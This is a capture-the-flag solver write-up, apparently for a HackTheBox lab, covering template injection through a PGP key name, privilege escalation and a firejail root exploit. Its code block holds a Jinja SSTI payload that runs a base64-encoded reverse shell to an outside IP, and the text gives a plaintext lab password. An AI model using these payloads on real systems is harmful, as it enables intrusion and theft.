## Solver
Check http://sandworm.htb/ redirect to https://ssa.htb/
Check fitur di ssa.htb, ada beberapa endpoint seperti /contact, /guide, /pgp
Karena aplikasi dibuild dengan flask, kemungkinan vulnerble dengan SSTI

Check satu persatu fitur nya, ada yang menarik dengan verify signature
Kita bisa generate pgp key sendiri dulu, kemudian private key dan public key hasil generate tadi di sign dengan message random

Coba inputkan ke fitur verify signature tersebut, tampil output Signature Verification Result
Disitu nampak menarik dimana terdapat name "banua" yang dirender. name tersebut sebelumnya diinputkan saat generate pgp key

Coba generate lagi dan ubah name nya menjadi "{{7x7}}", lalu lakukan seperti langkah biasanya, dan verify signature
Ternyata name yang sebelumnya "banua" di tempat yang sama berubah menjadi "49". Artinya inject point SSTI ada disitu

```
python3 keygen.py -p banua -n {{7*7}} -e banua@ssa.htb -b 4096
python3 keygen.py -p banua -n '{{cycler.__init__.__globals__.os.popen("echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjEwLzEyMzQgMD4mMQo= | base64 -d | bash").read()}}' -e banua@ssa.htb -b 4096
python3 sign.py -c 4096.pub.asc -k 4096.key.asc -p banua -m tes
```

Jailed bash
Read app.py found $M1DGu4rD$ but useless

How to get user atlas:
read .ssh/id_rsa private key, save in local and chmod 600, if libcrypto error, edit with vim and :wq

How to get user silentobserver
Read /home/atlas/.config/httpie/sessions/localhost_5000/admin.conf found password for silentobserver:quietLiketheWind22

run firejail exploit and got root
